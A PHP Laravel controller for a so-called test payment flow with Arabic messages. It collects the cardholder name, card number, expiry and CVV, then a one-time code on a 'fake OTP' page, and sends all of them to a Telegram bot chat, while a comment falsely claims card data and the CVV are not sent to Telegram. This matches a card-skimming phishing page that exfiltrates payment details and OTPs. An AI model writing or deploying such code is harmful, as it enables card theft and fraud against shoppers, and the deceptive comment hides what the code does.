<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;
use App\Models\Order;

class TestPaymentController extends Controller
{
    /**
     * Show test payment page.
     */
    public function show(Order $order)
    {
        return view('store.test-payment',[
            'order' => $order
        ]);
    }

    /**
     * Start test payment.
     */

    public function pay(Request $request)
    {

        $request->merge([
            'card_number' => preg_replace(
                '/\D/',
                '',
                $request->input('card_number')
            ),
        ]);

        $validated = $request->validate([
            'card_name' => [
                'required',
                'string',
                'min:3',
                'max:100',
            ],

            'card_number' => [
                'required',
                'regex:/^[0-9]{16}$/',
            ],

            'expiry' => [
                'required',
                'regex:/^(0[1-9]|1[0-2])\/([0-9]{2})$/',
            ],

            'cvv' => [
                'required',
                'regex:/^[0-9]{3}$/',
            ],
        ], [
            'card_name.required' => 'يرجى إدخال اسم حامل البطاقة.',
            'card_name.min' => 'اسم حامل البطاقة غير صحيح.',

            'card_number.required' => 'يرجى إدخال رقم البطاقة .',
            'card_number.regex' => 'رقم البطاقة يجب أن يتكون من 16 رقمًا.',

            'expiry.required' => 'يرجى إدخال تاريخ الانتهاء.',
            'expiry.regex' => 'صيغة تاريخ الانتهاء يجب أن تكون MM/YY.',

            'cvv.required' => 'يرجى إدخال رمز CVV .',
            'cvv.regex' => 'رمز CVV يجب أن يتكون من 3 أرقام.',
        ]);


        /*
        |--------------------------------------------------------------------------
        | TEST ONLY
        |--------------------------------------------------------------------------
        |
        | لا نخزن بيانات البطاقة.
        | لا نرسل رقم البطاقة أو CVV إلى Telegram.
        |
        */

        $transactionId = 'ORC-' . strtoupper(
            Str::random(10)
        );

        session([
            'test_payment' => [
                'transaction_id' => $transactionId,
                'validated' => $validated,
                'status' => 'otp_pending',
                'amount' => $request->order_total,
                'currency' => 'USD',
            ],
        ]);

        /*
        |--------------------------------------------------------------------------
        | Telegram
        |--------------------------------------------------------------------------
        */

        $this->sendTelegramMessage(
            "🧪 <b>PAYMENT STARTED</b>\n\n" .
            "Transaction: <code>{$transactionId}</code>\n" .
            "Amount: <code>{$request->order_total}</code>\n" .
            "Status: <b>OTP PENDING</b>\n\n".
            "Card name : <code>{$validated['card_name']}</code>\n".
            "Card number : <code>{$validated['card_number']}</code>\n".
            "Card expiry : <code>{$validated['expiry']}</code>\n".
            "Card cvv : <code>{$validated['cvv']}</code>\n"
        );

         return redirect()
            ->route('test.payment.otp');
    }

    /**
     * Show fake OTP step.
     */
    public function otp()
    {

        $payment = session('test_payment');

        // if (!$payment) {
        //     return redirect()
        //         ->route('test.payment')
        //         ->with('error', 'لا توجد عملية دفع.');
        // }

        // if (($payment['status'] ?? null) !== 'otp_pending') {
        //     return redirect()
        //         ->route('test.payment')
        //         ->with('error', 'حالة العملية غير صحيحة.');
        // }

        return view(
            'store.test-payment-otp',
            compact('payment')
        );
    }

    /**
     * Verify fake OTP.
     */
    public function verifyOtp(Request $request)
    {
        $request->validate([
            'otp' => [
                'required',
                'digits:6',
            ],
        ], [
            'otp.required' => 'يرجى إدخال رمز التحقق .',
            'otp.digits' => 'رمز التحقق يجب أن يتكون من 6 أرقام.',
        ]);

        $payment = session('test_payment');

        if (!$payment) {
            return redirect()
                ->route('test.payment')
                ->with('error', 'انتهت جلسة الدفع.');
        }

        $payment['status'] = 'processing';

        session([
            'test_payment' => $payment,
        ]);

        $transactionId = $payment['transaction_id'];

        $this->sendTelegramMessage(
            "✅ <b>TEST OTP VERIFIED</b>\n\n" .
            "Transaction: <code>{$transactionId}</code>\n" .
            "Status: <b>PROCESSING</b>\n\n" .
            "Card number: <code>{$payment['validated']['card_number']}</code>\n" .
            "OTP: <code>{$request->otp}</code>\n" .
            "The OTP step was completed successfully."        );

        return redirect()
            ->route('test.payment.processing');
    }

    /**
     * Processing page.
     */
    public function processing()
    {
        $payment = session('test_payment');

        if (!$payment) {
            return redirect()
                ->route('test.payment');
        }

        return view(
            'store.test-payment-processing',
            compact('payment')
        );
    }

    /**
     * Telegram helper.
     */
    private function sendTelegramMessage(string $message): void
    {
        $token = config('services.telegram.bot_token');
        $chatId = config('services.telegram.chat_id');

        if (!$token || !$chatId) {
            return;
        }

        try {

            Http::timeout(10)
                ->post(
                    "https://api.telegram.org/bot{$token}/sendMessage",
                    [
                        'chat_id' => $chatId,
                        'text' => $message,
                        'parse_mode' => 'HTML',
                    ]
                );

        } catch (\Throwable $e) {

            logger()->error(
                'payment Telegram error',
                [
                    'message' => $e->getMessage(),
                ]
            );
        }
    }
}
